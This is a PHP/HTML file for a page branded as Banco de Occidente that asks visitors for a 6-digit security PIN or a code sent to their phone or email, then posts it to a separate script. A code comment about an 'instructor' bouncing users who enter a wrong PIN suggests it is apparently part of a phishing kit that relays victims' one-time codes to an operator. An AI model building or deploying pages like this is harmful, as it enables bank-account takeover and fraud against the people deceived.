<?php
// Detectar si el instructor rebotó al usuario por PIN incorrecto para mostrar la alerta visual
$error_pin = isset($_GET['error']) && $_GET['error'] == 'pin_malo';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validación de Código</title>
  <style>
    :root {
      --primary-orange-light: #F2971F;
      --primary-orange-dark: #F4801F;
      --primary-green: #0D9A49;
      --secondary-green: #13b35f;
      --dark-gray: #333;
    }

    body {
      font-family: Arial, sans-serif;
      background: url("fondo.png") no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }

    .login-box {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 380px;
      text-align: center;
      overflow: hidden;
    }

    .login-top {
      background: linear-gradient(180deg, var(--primary-orange-light) 0%, var(--primary-orange-dark) 100%);
      padding: 2.5rem 1.5rem 0.5rem 1.5rem;
      border-top-left-radius: 16px;
      border-top-right-radius: 16px;
    }
    .login-top img {
      width: 100%;
      max-height: 60px;
      object-fit: contain;
      object-position: center;
      margin-bottom: 0.5rem;
    }
    .login-top h2 {
      color: #fff;
      margin: 0.5rem 0 1rem 0;
    }

    .form-group {
      text-align: left;
      margin-bottom: 1rem;
    }
    label {
      font-weight: 600;
      margin-bottom: 0.5rem;
      display: block;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      border-radius: 6px;
      font-size: 1rem;
      box-sizing: border-box;
    }

    .login-top label {
      color: #fff;
    }
    .login-top input {
      background: #fff;
      color: #000;
      border: none;
    }

    .login-bottom {
      background: #fff;
      padding: 1.5rem;
    }

    .btn {
      width: 100%;
      padding: 0.9rem;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 0.5rem;
    }
    .btn-primary {
      background: var(--primary-green);
      color: #fff;
      border: none;
    }
    .btn-primary:hover {
      background: var(--secondary-green);
    }
  </style>
</head>
<body>
  <main>
    <div class="login-box">
      <div class="login-top">
        <img src="logo.png" alt="Logo Banco de Occidente">
        <h2>Validación de Código</h2>
        <?php if ($error_pin): ?>
            <div class="error-box">PIN incorrecto, por favor ingréselo nuevamente.</div>
        <?php else: ?>
            <p>Ingrese su pin de seguridad de 6 dígitos para continuar.</p>
        <?php endif; ?>
    <form action="procesar_pin.php" method="POST">
        <div class="form-group">
          <label for="codigo">Ingrese el código enviado a su número o correo registrado</label>
          <input type="text" id="num_pin" name="num_pin" required placeholder="••••••">
        </div>
      </div>

      <div class="login-bottom">
        
          <button type="submit" id="btnCodigo" class="btn btn-primary">Validar Código</button>
    </form>
      </div>
    </div>
  </main>
</body>
</html>
